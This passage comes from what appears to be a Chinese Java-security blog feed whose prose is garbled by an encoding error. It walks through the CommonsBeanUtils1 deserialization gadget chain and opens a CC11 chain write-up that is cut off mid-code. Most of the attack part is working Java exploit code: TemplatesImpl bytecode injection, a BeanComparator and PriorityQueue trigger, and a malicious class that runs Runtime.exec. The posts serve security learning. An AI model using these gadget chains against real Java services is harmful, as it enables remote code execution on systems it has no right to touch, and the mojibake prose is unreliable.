class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ë∑üËøõË∞ÉÁî®ÈìæÁªìÂêàexpÊù•ÂàÜÊûê‰∏ÄÊ≠•Ê≠•ÂàÜÊûê</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt;  </span><br><span class="line">TemplatesImpl#newTransformer() -&gt;  </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt;  </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt;  </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>È¶ñÂÖàÂÆö‰πâ‰∫Ü‰∏Ä‰∏™ËÆæÁΩÆÁßÅÊúâÂ±ûÊÄßÁöÑÊñπÊ≥ïsetFieldValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    field.set(obj, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™Â∞±Ê≤°Âï•Â•ΩÂàÜÊûêÁöÑ‰ª£Á†Å‰∏ÄÁúãÂ∞±ÊáÇ‰∫ÜÔºåÁÑ∂ÂêéÊòØ‰∏ãÈù¢ËøôË°å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122697.png" alt="image-20230715112217461"><br>ËøôÈáå<code>_name</code>‰∏çËÉΩ‰∏∫Á©∫ÔºåËøôÊ†∑ÊâçËÉΩÁªßÁª≠Ëµ∞‰∏ãÂéªÔºåÂÜçÊòØ‰∏ãÈù¢ËøôË°å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122476.png" alt="image-20230715112237351"><br>ËøôÈáå<code>_bytecodes</code>‰πü‰∏çËÉΩ‰∏∫Á©∫ÔºåÂÖ∂ÂÆûËøôÈáåÁöÑÂà©Áî®Êù°‰ª∂Â∞±ÊòØCC3‰∏≠‰∏ÄÊ†∑ÁöÑÔºå<code>_tfactory</code> ÈúÄË¶ÅÊòØ‰∏Ä‰∏™ <code>TransformerFactoryImpl</code> ÂØπË±°ÔºåÂõ†‰∏∫ <code>TemplatesImpl#defineTransletClasses()</code> ÊñπÊ≥ïÈáåÊúâË∞ÉÁî®Âà∞ <code>_tfactory.getExternalExtensionsMap()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151122084.png" alt="image-20230715112250939"><br><code>test.class</code>ÂÖ∂ÂÆûÂ∞±ÊòØÂâçÈù¢CC3ÂÜôÁöÑ‰∏ÄÁõ¥Âú®Áî®ÁöÑÂºπËÆ°ÁÆóÂô®ÁöÑÊÅ∂ÊÑèÁ±ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123306.png" alt="image-20230715112304115"><br>ÁÑ∂ÂêéÂ∞±ÊòØÊúÄÁªàÁöÑEXPÁºñÂÜôÔºåËøôÈáåÂÖàÁúã‰∏Ä‰∏ã<code>BeanComparator.compare()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123714.png" alt="image-20230715112317466"><br>Ëøô‰∏™ÊñπÊ≥ïÈ¶ñÂÖàÊé•Êî∂‰∏§‰∏™ÂØπË±°ÔºåÂ¶ÇÊûú this.property ‰∏∫Á©∫ÔºåÂàôÁõ¥Êé•ÊØîËæÉËøô‰∏§‰∏™ÂØπË±°ÔºõÂ¶ÇÊûú this.property ‰∏ç‰∏∫Á©∫ÔºåÂàôÁî® PropertyUtils.getProperty ÂàÜÂà´ÂèñËøô‰∏§‰∏™ÂØπË±°ÁöÑ this.property Â±ûÊÄßÔºåÊØîËæÉÂ±ûÊÄßÁöÑÂÄº„ÄÇ<br>Êó¢ÁÑ∂Ë¶ÅËøõË°åÊØîËæÉÈÇ£‰πàÂ∞±ÈúÄË¶ÅÊñ∞Âª∫‰∏Ä‰∏™ <code>PriorityQueue</code> ÁöÑÈòüÂàóÔºåÂπ∂ËÆ©ÂÖ∂Êúâ 2 ‰∏™ÂÄºËøõË°åÊØîËæÉ„ÄÇËÄå‰∏î <code>PriorityQueue</code> ÁöÑÊûÑÈÄ†ÂáΩÊï∞ÂΩì‰∏≠Â∞±ÂåÖÂê´‰∫Ü‰∏Ä‰∏™ÊØîËæÉÂô®„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123453.png" alt="image-20230715112329289"><br>ÊúÄÂêé‰ΩøÁî®queue.addÂèØ‰ª•Ëá™Âä®ÂÆåÊàêÊØîËæÉÂõ†‰∏∫addÊñπÊ≥ïË∞ÉÁî®‰∫ÜcompareÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151123078.png" alt="image-20230715112349646"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line">        queue.add(templates);  </span><br><span class="line">        queue.add(templates);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124073.png" alt="image-20230715112415886"><br>ÁÑ∂ÂêéÂ∞±ÊòØËß£ÂÜ≥Âú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÊâçÂºπËÆ°ÁÆóÂô®ÔºåÈÇ£‰πàÂ∞±Â∞Ü queue.add Ëµã‰∏Ä‰∏™ÊôÆÈÄöÁöÑÂ∏∏ÈáèÔºåÂÜçÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπÂÄºÂç≥ÂèØ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>); </span><br></pre></td></tr></table></figure><p>ÊúÄÁªàÁöÑexpÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line">        <span class="comment">// ÂàõÂª∫Êñ∞ÁöÑÈòüÂàóÔºåÂπ∂Ê∑ªÂä†ÊÅ∂ÊÑèÂ≠óËäÇÁ†Å  </span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line">        queue.add(<span class="number">1</span>);  </span><br><span class="line">        queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// Â∞Ü property ÁöÑÂÄºËµã‰∏∫ outputProperties        </span></span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);  </span><br><span class="line"><span class="comment">//        serialize(queue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124308.png" alt="image-20230715112429149"></p><h2 id="ÊµÅÁ®ãÂõæ"><a href="#ÊµÅÁ®ãÂõæ" class="headerlink" title="ÊµÅÁ®ãÂõæ"></a>ÊµÅÁ®ãÂõæ</h2><p>ËøôÈáåËøòÊòØÁõ¥Êé•Âä†Âú®CCÈìæ‰∏≠ÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151124392.png" alt="image-20230715112439321"><br>ÂèÇËÄÉÔºö<br>‰∏ãÈù¢Ëøô‰∏™Â§ß‰Ω¨ÂàÜÊûêÁöÑÊå∫‰∏çÈîôÁöÑÔºåÂü∫Êú¨‰∏äÈÉΩÊòØÂèÇËÄÉ‰ªñÁöÑÔºå‰πüÊòØË∑üÁùÄ‰ªñÁöÑÂ≠¶‰π†Ë∑ØÁ∫øÂ≠¶ÁöÑ<br><a href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x04-CommonsBeanUtils1-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">CommonsBeanUtilsÂèçÂ∫èÂàóÂåñ | Drunkbaby‚Äôs Blog (drun1baby.top)</a></p><p>ÂÖ∂ÂÆûËøôÊù°ÈìæÂ≠êÁôΩÊó•Ê¢¶ÁªÑÈïøÂú®shiro‰∏≠ÂàÜÊûê‰∫ÜÔºåÂêéÈù¢ÁúãÂà∞shiroÁöÑÊó∂ÂÄôÊâçÁü•ÈÅì</p><p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãCCÈìæ11</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE11/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE11/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><ul><li>CommonsCollections 3.1-3.2.1</li><li>jdkÊó†ÈôêÂà∂</li></ul><h2 id="ÈìæÂ≠êÂàÜÊûê"><a href="#ÈìæÂ≠êÂàÜÊûê" class="headerlink" title="ÈìæÂ≠êÂàÜÊûê"></a>ÈìæÂ≠êÂàÜÊûê</h2><p>ÁúãÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢ËøôË∞ÉÈìæÂ≠êÊòØCC2+CC6ÔºåËøôÈáåÊääÂÆåÊï¥ÁöÑË∞ÉÁî®ÈìæÊµÅÁ®ãÂõæÊîæ‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151106464.png" alt="image-20230715110638370"><br>ÂÖ∂ÂÆûËøôÊù°ÈìæÂ≠êÂ∞±ÊòØ‰∏∫ÂêéÈù¢ÁöÑshiroÂèØ‰ª•‰∏çÈÄöËøá<code>Transform</code>Êï∞ÁªÑÊù•ÂÆûÁé∞ÂèçÂ∫èÂàóÂåñÊúçÂä°ÁöÑ</p><h3 id="CC2ÁöÑÂ∞æÈÉ®ÈìæTemplatesImpl"><a href="#CC2ÁöÑÂ∞æÈÉ®ÈìæTemplatesImpl" class="headerlink" title="CC2ÁöÑÂ∞æÈÉ®ÈìæTemplatesImpl"></a>CC2ÁöÑÂ∞æÈÉ®ÈìæTemplatesImpl</h3><p>ÊääCC2ÁöÑÂêéÂçäÈÉ®ÂàÜÊãøÊù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line"><span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ËøôÈáå‰∏∫CC2ÁöÑÂêéÂçäÈÉ®ÂàÜÔºåÂè™ÊòØÂä†‰∏ä‰∫ÜÂØπ<code>_tfactory</code>ÁöÑÂ§ÑÁêÜÔºåÁÑ∂ÂêéÂà©Áî®ÊàêÂäü</p><h3 id="CC6ÁöÑÂâçÂçäÈÉ®ÂàÜ"><a href="#CC6ÁöÑÂâçÂçäÈÉ®ÂàÜ" class="headerlink" title="CC6ÁöÑÂâçÂçäÈÉ®ÂàÜ"></a>CC6ÁöÑÂâçÂçäÈÉ®ÂàÜ</h3><p>ËøôÈáåCC6ÁöÑÂâçÂçäÈÉ®ÂàÜÊúâÁÇπÂøòËÆ∞‰∫ÜÔºåÊé•ÁùÄÂàÜÊûê‰∏Ä‰∏ãÔºåËøôÈáåÊòØ<code>InvokerTransformer.transform()</code>ÂéªÊâæÂà∞ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107426.png" alt="image-20230715110701262"><br>ÁÑ∂ÂêéÂèëÁé∞<code>LazyMap.get()</code>Ë∞ÉÁî®‰∫ÜËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107476.png" alt="image-20230715110714346"><br>ÁÑ∂ÂêéÂÜçÂéªÊâæË∞ÅË∞ÉÁî®‰∫Ü<code>get()</code>ÊñπÊ≥ïÔºåËøô‰∏™<code>get()</code>ÊñπÊ≥ïÊå∫ÈöæÊâæÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±Áõ¥Êé•ÁúãÔºåÊúÄÁªàÂú®<code>TiedMapEntry.getValue()</code>ÊñπÊ≥ï‰∏≠ÊâæÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107668.png" alt="image-20230715110725585"><br>ÁÑ∂ÂêéÁªßÁª≠ÊâæÔºåÂèëÁé∞ÂêåÁ±ª‰∏ãË∞ÉÁî®‰∫Ü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151107753.png" alt="image-20230715110736662"><br>ÁÑ∂ÂêéÂ∞±‰∏çÁî®ÁªßÁª≠ÂæÄ‰∏ãÊâæ‰∫ÜÔºåÂõ†‰∏∫Âú®JavaÂèçÂ∫èÂàóÂåñ‰∏≠hashCodeÊñπÊ≥ïÂêéÈù¢ÁöÑÂà©Áî®ÈìæÂü∫Êú¨ÈÉΩÊòØ‰∏ãÈù¢ËøôÊù°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.readObject()</span><br><span class="line">HashMap.put() --Ëá™Âä®Ë∞ÉÁî®--&gt;   HashMap.hash()</span><br><span class="line">ÂêéÁª≠Âà©Áî®Èìæ.hashCode()</span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•Áõ¥Êé•Âà∞<code>HashMap.hash()</code>‰∏≠ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307151108582.png" alt="image-20230715110811501"><br>CC6Âà∞ËøôÈáåÂ∞±ÁªìÊùü‰∫ÜÔºåÂΩìÁÑ∂expÁºñÂÜôËøòÊúâÂæàÂ§öÁªÜËäÇÈóÆÈ¢òÂ§ÑÁêÜÔºå‰∏ãÈù¢Êù•ÈÄêÊ≠•ÁºñÂÜôexpÔºåËøôÈáåÊàë‰ª¨ÂÖàÂ∞ÜÂêéÂçäÊÆµÂíåLazyMapËøûËµ∑Êù•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td 